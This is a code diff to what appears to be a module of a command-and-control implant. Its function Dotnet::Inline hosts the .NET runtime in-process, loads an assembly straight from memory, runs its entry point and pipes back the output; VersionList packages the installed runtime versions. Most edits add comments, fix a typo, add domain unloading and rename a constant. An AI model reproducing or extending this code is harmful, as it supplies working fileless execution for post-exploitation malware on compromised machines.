@@ -48,13 +48,17 @@ auto DECLFN Dotnet::Inline(
 
     SECURITY_ATTRIBUTES SecAttr = { 0 };
 
+    //
     // host clr in the process
+    //
     HResult = Self->Mscoree.CLRCreateInstance( 
         Self->Dot->CLSID.CLRMetaHost, Self->Dot->IID.ICLRMetaHost, (PVOID*)&MetaHost 
     );
     if ( HResult ) goto _KH_END;
 
+    //
     //  get the last version if parameters is not passed
+    //
     if ( ( Str::CompareW( Version, L"v0.0.00000" ) == 0 ) ) {
         HResult = MetaHost->EnumerateInstalledRuntimes( &EnumUkwn );
         if ( HResult ) goto _KH_END;
@@ -75,19 +79,30 @@ auto DECLFN Dotnet::Inline(
     HResult = MetaHost->GetRuntime( Version, Self->Dot->IID.ICLRRuntimeInfo, (PVOID*)&RtmInfo );
     if ( HResult ) goto _KH_END;
 
+    //
+    // check if runtime is loadable
+    //
     HResult = RtmInfo->IsLoadable( &IsLoadable );
     KhDbg( "is loadable: %s", IsLoadable ? "true" : "false" );
     if ( HResult || !IsLoadable ) goto _KH_END;
 
+    //
+    // load clr version
+    //
     HResult = RtmInfo->GetInterface( 
         Self->Dot->CLSID.CorRuntimeHost, Self->Dot->IID.ICorRuntimeHost, (PVOID*)&RtmHost 
     );
     if ( HResult ) goto _KH_END;
 
+    //
+    // start the clr loaded
+    //
     HResult = RtmHost->Start();
     if ( HResult ) goto _KH_END;
 
+    //
     // create the app domain
+    //
     HResult = RtmHost->CreateDomain( AppDomName, 0, &AppDomThunk );
     if ( HResult ) goto _KH_END;
 
@@ -97,22 +112,32 @@ auto DECLFN Dotnet::Inline(
     SafeBound = { AsmLength, 0 };
     SafeAsm   = Self->Oleaut32.SafeArrayCreate( VT_UI1, 1, &SafeBound );
 
-    // copy the dotnet assembpy to safe array
+    //
+    // copy the dotnet assembly to safe array
+    //
     Mem::Copy( SafeAsm->pvData, AsmBytes, AsmLength );
 
+    //
     // load the dotnet
+    //
     HResult = AppDom->Load_3( SafeAsm, &Assembly );
     if ( HResult ) goto _KH_END;
 
+    //
     // get the entry point
+    //
     HResult = Assembly->get_EntryPoint( &MethodInfo );
     if ( HResult ) goto _KH_END;
 
+    //
     // get the parameters requirements
+    //
     HResult = MethodInfo->GetParameters( &SafeExpc );
     if ( HResult ) goto _KH_END;
 
+    //
     // work with parameters requirements and do it
+    //
 	if ( SafeExpc ) {
 		if ( SafeExpc->cDims && SafeExpc->rgsabound[0].cElements ) {
 			SafeArgs = Self->Oleaut32.SafeArrayCreateVector( VT_VARIANT, 0, 1 );
@@ -136,7 +161,9 @@ auto DECLFN Dotnet::Inline(
 		}
 	}
 
+    //
     // set the output console
+    //
     SecAttr = { sizeof( SECURITY_ATTRIBUTES ), nullptr, TRUE };
 
     Self->Krnl32.CreatePipe( &PipeRead, &PipeWrite, &SecAttr, PIPE_BUFFER_LENGTH );
@@ -156,16 +183,22 @@ auto DECLFN Dotnet::Inline(
 
     KhDbg( "invoking .NET assembly" );
 
+    //
     // invoke/execute the dotnet assembly
+    //
     HResult = MethodInfo->Invoke_3( VARIANT(), SafeArgs, nullptr );
     if ( HResult ) goto _KH_END;
 
+    //
     // allocate memory to output buffer
+    //
     Self->Dot->Out.p = (PCHAR)Self->Hp->Alloc( PIPE_BUFFER_LENGTH );
 
     KhDbg( "start read output of the assembly" );
 
+    //
     // read the output
+    //
     Success = Self->Krnl32.ReadFile( PipeRead, Self->Dot->Out.p, PIPE_BUFFER_LENGTH, &Self->Dot->Out.s, nullptr );
 
     KhDbg( "dotnet asm output [%d bytes] %s", Self->Dot->Out.s, Self->Dot->Out.p );
@@ -213,6 +246,10 @@ _KH_END:
         RtmInfo->Release();
     }
 
+    if ( !KeepLoad ) {
+        RtmHost->UnloadDomain( AppDomThunk );
+    } 
+
     if ( RtmHost ) {
         RtmHost->Release();
     }
@@ -232,13 +269,17 @@ auto Dotnet::VersionList( VOID ) -> VOID {
     IEnumUnknown*    EnumUkwn    = { 0 };
     ICLRMetaHost*    MetaHost    = { 0 };
 
+    //
     // host clr in the process
+    //
     HResult = Self->Mscoree.CLRCreateInstance(
         Self->Dot->CLSID.CLRMetaHost, Self->Dot->IID.ICLRMetaHost, (PVOID*)&MetaHost
     );
     if ( HResult ) goto _KH_END;
 
-    //  get the last version if parameters is not passed
+    //
+    //  packet the versions
+    //
     HResult = MetaHost->EnumerateInstalledRuntimes( &EnumUkwn );
     if ( HResult ) goto _KH_END;
 
@@ -248,7 +289,7 @@ auto Dotnet::VersionList( VOID ) -> VOID {
         if ( SUCCEEDED( EnumRtm->QueryInterface( Self->Dot->IID.ICLRRuntimeInfo, (PVOID*)&RtmInfo) ) && RtmInfo ) {
 
             if ( SUCCEEDED( RtmInfo->GetVersionString( FmVersion, &FmBuffLen ) ) ) {
-                Self->Pkg->Bytes( GLOBAL_PKG, (PUCHAR)FmVersion, FmBuffLen );
+                Self->Pkg->Bytes( G_PACKAGE, (PUCHAR)FmVersion, FmBuffLen );
                 KhDbg("supported version: %S", FmVersion);
             }
         }
@@ -262,6 +303,11 @@ _KH_END:
 
     return;
 }
+
+// auto Dotnet::AddTable(
+//     _In_ PCHAR AppDomain,
+
+// )
 
 // auto Dotnet::PatchExit(
 //     _In_ ICorRuntimeHost* IRuntime
